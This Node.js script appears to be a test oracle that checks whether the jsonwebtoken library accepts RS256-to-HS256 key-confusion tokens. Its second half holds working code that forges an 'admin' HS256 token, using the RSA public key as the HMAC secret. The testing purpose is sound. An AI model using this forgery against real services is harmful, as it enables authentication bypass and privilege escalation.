'use strict';
const crypto = require('node:crypto');

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

function main() {
  let jwt;
  try {
    jwt = require('jsonwebtoken');
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
    return;
  }

  const marker = 'JWT_ORACLE_' + process.pid + '_' + Date.now();

  // ---- Benign operation: sign and verify with HS256, works as expected ----
  let benignOk = false;
  try {
    const secret = 'benign-secret-' + marker;
    const token = jwt.sign({ marker: marker, role: 'user' }, secret, { algorithm: 'HS256', expiresIn: '1h' });
    const decoded = jwt.verify(token, secret);
    if (decoded && decoded.marker === marker && decoded.role === 'user') {
      benignOk = true;
    }
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign sign/verify operation failed: ' + String(e && e.message) });
    return;
  }

  if (!benignOk) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign verify did not return expected payload' });
    return;
  }

  const operation_completed = true;

  // ---- Malicious operation: RS256-to-HS256 key confusion attack ----
  let keyPair;
  try {
    keyPair = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
    });
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'keypair generation failed: ' + String(e && e.message) });
    return;
  }

  const publicKeyPem = keyPair.publicKey;
  const privateKeyPem = keyPair.privateKey;

  // Legitimate usage: application signs with RS256 private key, verifies
  // with RS256 public key, but (as commonly seen in vulnerable real-world
  // code) does NOT restrict the allowed algorithms on verify().
  let legitimateVerifyOk = false;
  try {
    const legitToken = jwt.sign({ marker: marker, role: 'user' }, privateKeyPem, { algorithm: 'RS256', expiresIn: '1h' });
    const legitDecoded = jwt.verify(legitToken, publicKeyPem);
    if (legitDecoded && legitDecoded.marker === marker && legitDecoded.role === 'user') {
      legitimateVerifyOk = true;
    }
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'legitimate RS256 sign/verify setup failed: ' + String(e && e.message) });
    return;
  }

  if (!legitimateVerifyOk) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'legitimate RS256 verify did not return expected payload' });
    return;
  }

  // Attacker (who only knows the PUBLIC key, which is by definition public)
  // forges a token using HS256, treating the public key PEM text as the HMAC
  // secret. If the server's verify() call (above pattern, no algorithms
  // restriction) accepts it, the algorithm-confusion exploit succeeded.
  function base64url(buf) {
    return Buffer.from(buf).toString('base64')
      .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  }

  const header = { alg: 'HS256', typ: 'JWT' };
  const now = Math.floor(Date.now() / 1000);
  const payload = { marker: marker, role: 'admin', iat: now, exp: now + 3600 };

  const headerEncoded = base64url(JSON.stringify(header));
  const payloadEncoded = base64url(JSON.stringify(payload));
  const signingInput = headerEncoded + '.' + payloadEncoded;

  const hmac = crypto.createHmac('sha256', publicKeyPem);
  hmac.update(signingInput);
  const signature = base64url(hmac.digest());

  const forgedToken = signingInput + '.' + signature;

  let exploit_succeeded = false;
  let evidence = '';

  try {
    // Server-side call site reuses the SAME public key material and does
    // not pin `algorithms`, mirroring the vulnerable real-world pattern.
    const decodedMalicious = jwt.verify(forgedToken, publicKeyPem);
    if (decodedMalicious && decodedMalicious.marker === marker && decodedMalicious.role === 'admin') {
      exploit_succeeded = true;
      evidence = 'jwt.verify() accepted an HS256-forged token using the RSA public key as HMAC secret and returned payload: ' + JSON.stringify(decodedMalicious);
    } else {
      evidence = 'jwt.verify() returned unexpected payload for forged token: ' + JSON.stringify(decodedMalicious);
    }
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'jwt.verify() rejected the RS256-to-HS256 key-confusion forged token as expected: ' + String(e && e.message);
  }

  finish({ operation_completed: operation_completed, exploit_succeeded: exploit_succeeded, evidence: evidence });
}

try {
  main();
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'uncaught exception: ' + String(e && e.message) });
}
